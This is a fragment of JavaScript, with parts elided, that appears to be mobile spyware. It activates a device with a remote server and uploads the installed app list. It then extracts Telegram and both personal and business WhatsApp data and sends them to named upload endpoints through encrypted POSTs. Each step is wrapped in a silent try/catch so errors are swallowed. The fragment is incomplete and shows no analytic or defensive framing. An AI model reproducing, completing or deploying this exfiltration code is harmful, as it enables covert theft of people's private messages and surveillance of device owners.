...
(function() {
  ...
  dsNetNative.setChannel(typeof CC !== "undefined" ? CC : "");
  dsNetNative.setDeviceIdentity({
  ...
  // 1. Activate device
  try {
    dsNetNative.postEncryptedToServer(CD, dsNetNative.ENDPOINTS.activate, {
  ...
  try {
    ...
    if (appList && appList.length > 0) {
      dsNetNative.postEncryptedToServer(CD, dsNetNative.ENDPOINTS.apps, {
        al: appList
      });
    }
  } catch(e) {}
  ...
  try {
    ...
    if (tgPayload) dsNetNative.postEncryptedToServer(CD, dsNetNative.ENDPOINTS.telegramUpload, tgPayload);
  } catch(e) {}

  // 4. Extract WhatsApp (personal + business; always POST rc or diag)
  try {
    var waPayload = extractWhatsApp(deviceInfo, "personal");
    if (waPayload) dsNetNative.postEncryptedToServer(CD, dsNetNative.ENDPOINTS.whatsappUpload, waPayload);
  } catch(e) {}
  try {
    var waBizPayload = extractWhatsApp(deviceInfo, "business");
    if (waBizPayload) dsNetNative.postEncryptedToServer(CD, dsNetNative.ENDPOINTS.whatsappUpload, waBizPayload);
  } catch(e) {}
